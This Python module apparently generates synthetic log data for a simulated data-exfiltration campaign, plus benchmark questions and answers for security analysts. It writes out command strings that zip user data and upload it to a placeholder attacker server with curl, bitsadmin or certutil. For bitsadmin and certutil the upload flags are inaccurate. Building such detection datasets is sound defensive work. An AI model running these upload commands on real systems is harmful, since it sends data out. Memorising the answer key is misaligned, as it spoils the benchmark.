import polars as pl
from faker import Faker
import random
from datetime import datetime, timedelta
from tqdm import tqdm
from ..utils import (
    generate_identity_info,
    generate_aad_sign_in_events,
    generate_device_info,
    generate_device_events,
    generate_device_file_events,
    generate_device_process_events,
    generate_email_events,
    generate_inbound_network_events,
    generate_outbound_network_events
)

class DataExfiltrationAttackGenerator:
    def __init__(self, benign_data, victims, attacker, last_scan_time):
        self.fake = Faker()
        self.benign_data = benign_data
        self.last_scan_time = last_scan_time
        self.victims = victims
        self.attacker = attacker
        self.data = None
        self.exfil_file = self.fake.file_name(extension="zip")

    def generate_data_exfiltration_attack(self):
        data = {}
        process_events = []
        network_events = []

        campaign_time = self.fake.date_time_between(
            start_date=self.last_scan_time, end_date=datetime.today()
        )
        compromised_victims = set()
        victim_selected = False

        for victim in tqdm(self.victims.iter_rows(named=True), desc="Generating data exfiltration events"):
            if random.random() < 0.3 or not victim_selected:
                victim_selected = True
                compromised_victims.add(victim["AccountUpn"])

                user_devices = self.benign_data["device_info"].filter(
                    pl.col("LoggedOnUsers").str.contains(victim["AccountUpn"])
                )
                if not user_devices.height:
                    continue
                user_device = user_devices.sample(n=1)
                user_device = dict(zip(user_device.columns, user_device.row(0)))

                compress_time = campaign_time + timedelta(seconds=random.randint(0, 600))
                compression_command = f"7z.exe a -tzip {self.exfil_file} C:\\data"
                process_events.append(
                    generate_device_process_events(
                        identity_row=victim,
                        device_row=user_device,
                        timestamp=compress_time,
                        fake=self.fake,
                        file_name=self.exfil_file,
                        process_command_line=compression_command,
                    )
                )

                upload_time = compress_time + timedelta(seconds=random.randint(100, 300))
                upload_tool = random.choice(["curl.exe", "bitsadmin.exe", "certutil.exe"])
                upload_command = f"{upload_tool} -X PUT {self.attacker['ExternalServerName']} -T {self.exfil_file}"
                process_events.append(
                    generate_device_process_events(
                        identity_row=victim,
                        device_row=user_device,
                        timestamp=upload_time,
                        fake=self.fake,
                        file_name=self.exfil_file,
                        process_command_line=upload_command,
                    )
                )

                net_time = upload_time + timedelta(seconds=random.randint(50, 200))
                network_events.append(
                    generate_outbound_network_events(
                        identity_row=victim,
                        device_row=user_device,
                        timestamp=net_time,
                        fake=self.fake,
                        remote_ip=self.attacker['ExternalServerIP'],
                        remote_url=self.attacker['ExternalServerName'],
                        remote_port=random.randint(1024, 65535),
                    )
                )

        data["process_events"] = (
            pl.DataFrame(process_events).sort("Timestamp") if process_events else pl.DataFrame()
        )
        data["device_network_events"] = (
            pl.DataFrame(network_events).sort("Timestamp") if network_events else pl.DataFrame()
        )
        self.data = data

        last_event_time = (
            pl.DataFrame(process_events + network_events)["Timestamp"].max()
            if process_events or network_events
            else None
        )
        compromised_victims = self.victims.filter(pl.col("AccountUpn").is_in(compromised_victims)) if compromised_victims else pl.DataFrame()

        return data, compromised_victims, last_event_time

    def generate_question_answer_pairs(self):
        all_process_events = pl.concat(
            [self.benign_data["device_process_events"], self.data["process_events"]]
        )
        all_network_events = pl.concat(
            [self.benign_data["device_network_events"], self.data["device_network_events"]]
        )

        questions = []
        answers = []

        # Q1
        questions.append("How many unique devices were involved in the data exfiltration events?")
        subset = all_network_events.filter(pl.col("RemoteUrl") == self.attacker['ExternalServerName'])
        Q1_answer = (
            subset.select(pl.col("DeviceId").n_unique()).item() if subset.height else 0
        )
        answers.append(Q1_answer)

        # Q2
        questions.append("What is the name of the file that was exfiltrated?")
        subset = all_process_events.filter(pl.col("ProcessCommandLine").str.contains("7z.exe a"))
        Q2_answer = subset.select("FileName").to_series().to_list()
        answers.append(Q2_answer[0] if Q2_answer else "N/A")

        # Q3
        questions.append("Which compression tool was used during the data exfiltration?")
        subset = all_process_events.filter(pl.col("ProcessCommandLine").str.contains("7z.exe"))
        Q3_answer = (
            subset.select("ProcessCommandLine").to_series().to_list()[0].split()[0]
            if subset.height
            else "N/A"
        )
        answers.append(Q3_answer)

        # Q4
        questions.append("What is the remote destination URL used for data exfiltration?")
        subset = all_network_events.filter(pl.col("RemoteUrl") == self.attacker['ExternalServerName'])
        Q4_answer = subset.select("RemoteUrl").to_series().to_list()
        answers.append(Q4_answer[0] if Q4_answer else "N/A")

        # Q6
        questions.append("Which tool was used for uploading (exfiltrating) the file?")
        malicious_process = self.data["process_events"]
        subset = malicious_process.filter(pl.col("ProcessCommandLine").str.contains("PUT"))
        Q6_answer = (
            subset.select("ProcessCommandLine").to_series().to_list()[0].split()[0]
            if subset.height
            else "N/A"
        )
        answers.append(Q6_answer)

        # Q7
        questions.append("What is the average file size of the exfiltrated file (in bytes)?")
        subset = malicious_process.filter(pl.col("FileName") == self.exfil_file)
        if subset.height and "FileSize" in subset.columns:
            Q7_answer = subset.select(pl.col("FileSize").mean()).item()
        else:
            Q7_answer = "N/A"
        answers.append(Q7_answer)

        # Q8
        questions.append("What is the average delay (in seconds) between compression and upload events for each victim?")
        delays = []
        for device_id, group in malicious_process.group_by("DeviceId"):
            group = group.sort("Timestamp")
            compress = group.filter(pl.col("ProcessCommandLine").str.contains("7z.exe a"))
            upload = group.filter(pl.col("ProcessCommandLine").str.contains("PUT"))
            if compress.height and upload.height:
                c_time = compress.select("Timestamp").to_series().to_list()[0]
                u_time = upload.select("Timestamp").to_series().to_list()[0]
                delays.append((u_time - c_time).total_seconds())
        Q8_answer = sum(delays) / len(delays) if delays else "N/A"
        answers.append(Q8_answer)

        # Q9
        questions.append("What is the most common protocol used in the exfiltration network events?")
        net_df = self.data["device_network_events"]
        if net_df.height and "Protocol" in net_df.columns:
            Q9_answer = net_df.select("Protocol").to_series().value_counts().row(0)[0]
        else:
            Q9_answer = "N/A"
        answers.append(Q9_answer)

        return pl.DataFrame({"Question": questions, "Answer": answers}, strict=False)